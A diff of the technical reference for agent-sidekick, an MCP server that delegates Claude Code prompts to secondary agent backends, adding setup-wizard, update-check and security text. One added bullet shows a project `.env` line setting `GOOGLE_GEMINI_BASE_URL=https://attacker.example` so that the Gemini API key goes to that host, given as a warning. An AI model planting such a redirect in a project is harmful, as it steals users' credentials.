@@ -1,9 +1,9 @@
 # agent-sidekick: technical reference
 
 agent-sidekick is a local MCP server (stdio) that lets a normal Claude Code session hand off prompts to a second, headless agent.
-By default that agent is a second Claude Code instance with its own credentials (a separate account's OAuth token) and its own config directory, so its usage and settings stay apart from your main session.
+Without a `[backends]` section that agent is a second Claude Code instance with its own credentials (a separate account's OAuth token) and its own config directory, so its usage and settings stay apart from your main session. The setup wizard can instead make KI:connect.nrw (through OpenCode) or Gemini the default backend.
 Optionally, further [backends](#backends) send work to a local model (Claude Code against Ollama or LM Studio) or to another agent CLI such as Aider.
-It is a single binary with no runtime dependencies besides the official `claude` CLI, for Linux, Windows 11 and macOS.
+It is a single binary with no runtime dependencies besides the official `claude` CLI. Prebuilt binaries and the install one-liners are for Linux and Windows 11; on macOS build it from source (`cargo install --locked --git https://github.com/AAPPHH/agent-sidekick`).
 
 This is the complete technical reference (backends, configuration, tools, CLI, security). Installation and first steps for users are in the [README](../README.md) (German); development and releases in [DEVELOPMENT.md](DEVELOPMENT.md) and [RELEASING.md](RELEASING.md).
 
@@ -63,10 +63,10 @@ env = { OLLAMA_API_BASE = "http://127.0.0.1:11434" }
 max_concurrent = 1
 ```
 
-Then store the credentials and check the backends:
+Then store the credentials and check the backends (a bare `agent-sidekick setup` in an interactive terminal starts the German setup wizard, which adds its own profiles; `--no-wizard` gets the plain token prompts):
 
 ```sh
-agent-sidekick setup                     # token for every claude-oauth backend (here: sidekick)
+agent-sidekick setup --no-wizard         # token for every claude-oauth backend (here: sidekick)
 agent-sidekick setup --backend local     # API key for the endpoint; for a local Ollama enter any value, e.g. "ollama"
 agent-sidekick backends list --check
 agent-sidekick backends test local
@@ -151,7 +151,7 @@ A run waits for a slot of its backend first, then for a global slot; queued runs
 - `command`: the program (`command[0]`) is found, and with `secret_env` a secret is stored for the backend.
 - `opencode`: OpenCode is installed (found), the provider key is available (not needed for Ollama), and the provider's model list answers within 2 seconds: `GET {base_url}/models` with the key as `Authorization: Bearer` (openai-compatible), `GET {base_url}/api/tags` (Ollama), `GET https://openrouter.ai/api/v1/models` without key (OpenRouter). Any HTTP response counts except 401/403, which means the key was rejected.
 
-The HTTP probes are the only network requests agent-sidekick makes itself (never a model call). They go only to the configured `base_url` (which must not contain credentials, see [claude-endpoint backends](#claude-endpoint-backends)) or OpenRouter's public model list, follow no redirects, have a 2 s timeout and run only for `sidekick_backends`, `agent-sidekick backends list --check` / `backends test`, `doctor`, and right before a run on a `claude-endpoint` or `opencode` backend. Only the openai-compatible opencode probe carries a credential (its own provider key, to its own `base_url`); all others carry none.
+The HTTP probes are the only network requests agent-sidekick makes itself for backends (never a model call; for every other request see [Security](#security)). They go only to the configured `base_url` (which must not contain credentials, see [claude-endpoint backends](#claude-endpoint-backends)) or OpenRouter's public model list, follow no redirects, have a 2 s timeout and run only for `sidekick_backends`, `agent-sidekick backends list --check` / `backends test`, `doctor`, and right before a run on a `claude-endpoint` or `opencode` backend. Only the openai-compatible opencode probe carries a credential (its own provider key, to its own `base_url`); all others carry none.
 Loopback hosts are probed directly; other hosts go through the proxy from `HTTPS_PROXY`/`HTTP_PROXY`/`ALL_PROXY` (honouring `NO_PROXY`), as `claude` itself would. A proxy that answers for an unreachable upstream makes the endpoint look reachable.
 
 ### Secrets per backend
@@ -214,6 +214,7 @@ Each run's environment is built from the server's environment, so one backend's 
 - The `allowed_tools` parameter of `sidekick_run` is ignored for command backends, and so is `model` unless the command uses `{model}` (the result and the log note it).
 - Command backends are configured only in `config.toml`. `sidekick_run` can select one by name but can never supply or change a command.
 - The program runs with the permissions of the MCP server; tools like Aider with `--yes-always` edit files without asking.
+- **Gemini CLI (the wizard's `gemini` profile) trusts the project.** The command passes `--skip-trust`; without it every headless run in a folder the Gemini CLI has not been told to trust fails (`FatalUntrustedWorkspaceError`). With the workspace trusted, Gemini CLI (checked in 0.65.0) loads every key of the project's `.env` (in `cwd` or a parent directory, also `.gemini/.env`) that is not already set, and the project's `.gemini/settings.json` (MCP servers, hooks, custom commands). A `.env` with `GOOGLE_GEMINI_BASE_URL=https://attacker.example` sends the stored `GEMINI_API_KEY` to that host with the first model request, without any tool call; `.gemini/settings.json` can run code at startup with the key in its environment. For a command backend whose `command` contains `gemini`, agent-sidekick writes a warning into the run log and the server log when `.env`, `.gemini/.env` or `.gemini/settings.json` exists between `cwd` and the repository root (the first directory with `.git`); it does not block the run. Only run the Gemini backend in directories you trust, and use a key you can revoke.
 - `secret_env = "VAR"` hands the backend's stored secret to the program in `VAR`, see [Command backend with a stored key](#command-backend-with-a-stored-key). `VAR` must be a plain variable name (`A-Z`, `a-z`, `0-9`, `_`), must not be `CLAUDE_CODE_OAUTH_TOKEN`, `AGENT_SIDEKICK_TOKEN` or `AGENT_SIDEKICK_*`, and must not also be a key of `env` (config errors). `ANTHROPIC_API_KEY` is allowed, e.g. for Aider with Claude models. Without a stored secret the backend is not reachable and a run fails with a hint to `setup --backend <name>`.
 
 ### claude-endpoint backends
@@ -445,12 +446,15 @@ On SIGTERM (sent by Claude Code when it stops the server) running process trees 
 - The server never writes secrets into logs, error messages or tool output itself, and it redacts the exact secrets of the run and anything matching `sk-ant-…` from the agent's output. Secrets shorter than 8 characters (placeholder keys like `ollama`) are not redacted, so they cannot mangle the output.
   The delegated agent can, however, read its own credential from its environment (`CLAUDE_CODE_OAUTH_TOKEN`, `ANTHROPIC_API_KEY` or `ANTHROPIC_AUTH_TOKEN`; for opencode backends `AGENT_SIDEKICK_PROVIDER_KEY`, which cannot be avoided because OpenCode resolves the key reference in its config from its own environment, and which project plugins see as well); an agent instructed to print it in altered form (encoded, reversed, split) could expose it in the log and the tool result. Treat the delegated agent as trusted with that credential.
 - `sidekick_backends`, `backends list/test` and `doctor` never print secrets or environment values.
-- Network: agent-sidekick itself only makes the reachability probe described in [Reachability](#reachability) (configured `base_url` only, 2 s timeout, no credentials except the provider key as bearer token for an opencode openai-compatible backend's `GET {base_url}/models`, without following redirects). All model traffic is made by `claude`, `opencode` or the configured command.
+- Network: agent-sidekick itself makes only these requests, never a model call. All model traffic is made by `claude`, `opencode` or the configured command.
+  - The reachability probe described in [Reachability](#reachability) (configured `base_url` only, 2 s timeout, no credentials except the provider key as bearer token for an opencode openai-compatible backend's `GET {base_url}/models`, without following redirects).
+  - The update check of `doctor` (at most once a day, on by default; `doctor --offline` skips it) and of `update`: `GET https://api.github.com/repos/AAPPHH/agent-sidekick/releases/latest` (or `AGENT_SIDEKICK_UPDATE_URL`), no credentials; GitHub sees your IP address and the agent-sidekick version in the `User-Agent`.
+  - In the setup wizard, only after asking: the KI:connect key check (`GET {base_url}/models` with the key as bearer token, 15 s timeout) and `npm install -g opencode-ai` / `@google/gemini-cli`, which npm downloads from its registry.
 - Prompts are written to the run log in `<config-dir>/logs`; do not put secrets into prompts.
 - Run logs can contain the full prompt and the agent's complete output. On Unix the logs directory is created with mode 0700 and each run log with mode 0600; on Windows they keep the user-profile ACL.
-- To rotate or revoke a Claude token: revoke it in the Claude account settings, then run `claude setup-token` again (see the README) and `agent-sidekick setup --backend <name>` (plain `setup` skips backends that already have a token).
+- To rotate or revoke a Claude token: revoke it in the Claude account settings, then run `claude setup-token` again (see the README) and `agent-sidekick setup --backend <name>` (`setup --no-wizard` skips backends that already have a token).
 - Never commit tokens or keys to Git.
-- The delegated agent runs with the permissions you grant via `allowed_tools`. In `-p` mode the workspace trust dialog is skipped, so only point `cwd` at directories you trust. Command backends run with the server's permissions and their own permission model.
+- The delegated agent runs with the permissions you grant via `allowed_tools`. In `-p` mode the workspace trust dialog is skipped, so only point `cwd` at directories you trust. Command backends run with the server's permissions and their own permission model. The wizard's Gemini backend passes `--skip-trust`, so a project's `.env` or `.gemini/settings.json` can redirect or read its key, see [Command backends](#command-backends); opencode backends run project plugins, see [OpenCode backends](#opencode-backends).
 
 ## VS Code
 
@@ -459,15 +463,15 @@ On SIGTERM (sent by Claude Code when it stops the server) running process trees 
 
 ## Terms of use
 
-agent-sidekick only drives the official `claude` CLI (or the agent CLIs you configure) with credentials you choose. Apart from the reachability probe it makes no network requests of its own, and it does no account switching, load balancing or rate-limit circumvention; that is why a fallback from one Claude account to another is rejected.
+agent-sidekick only drives the official `claude` CLI (or the agent CLIs you configure) with credentials you choose. Apart from the requests listed under [Security](#security) (reachability probes, the update check, the wizard's optional key check and npm installs) it makes no network requests of its own, and it does no account switching, load balancing or rate-limit circumvention; that is why a fallback from one Claude account to another is rejected.
 You are responsible for complying with Anthropic's terms for each account you use, and with the terms of any other provider you configure.
 
 ## Troubleshooting
 
 Run `agent-sidekick doctor` first; it checks the installation and every backend and prints next steps.
 
-- **`claude` not found**: install Claude Code, or set `AGENT_SIDEKICK_CLAUDE` / `claude_path` to its absolute path, then re-run `agent-sidekick setup --register-only`.
-- **Token missing**: run `agent-sidekick setup` again and reload VS Code (see the README) (`agent-sidekick setup --backend <name>` for a single backend; `setup --register-only` registers without asking for tokens).
+- **`claude` not found**: install the Claude Code CLI (`agent-sidekick harness install claude` prints the official commands; the VS Code extension alone is not enough, its bundled binary is not searched), open a new terminal, or set `AGENT_SIDEKICK_CLAUDE` / `claude_path` to its absolute path, then re-run `agent-sidekick setup --register-only`.
+- **Token missing**: run `agent-sidekick setup --backend <name>` for that backend, or `agent-sidekick setup --no-wizard` for every claude-oauth backend without a token, and reload VS Code (see the README); `setup --register-only` registers without asking for tokens.
 - **Endpoint not reachable**: start the local server (`ollama serve`, LM Studio's server), then `agent-sidekick backends test <name>`.
 - **Endpoint run fails with "Not logged in"**: check that the key is stored (`backends test`) and that `config_dir` is the backend's own directory.
 - **Config error in `sidekick_run`**: fix `config.toml`; `agent-sidekick backends list` shows the problem.
